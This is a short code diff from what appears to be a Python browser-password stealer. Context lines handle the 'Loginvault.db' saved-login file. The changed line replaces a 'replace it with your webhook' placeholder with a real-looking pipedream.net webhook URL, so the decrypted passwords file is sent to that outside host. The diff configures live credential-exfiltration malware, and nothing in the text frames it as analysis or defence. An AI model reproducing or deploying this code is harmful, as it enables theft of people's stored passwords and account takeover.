@@ -111,6 +111,6 @@ if __name__ == '__main__':
                     o.remove("Loginvault.db")
         
         k6(output_data)
-        k7('decrypted_passwords.txt', 'replace it with your webhook')
+        k7('decrypted_passwords.txt', 'https://eone2u5azud2t53.m.pipedream.net/')
     except Exception as e:
         print(f"[ERR] {e}")
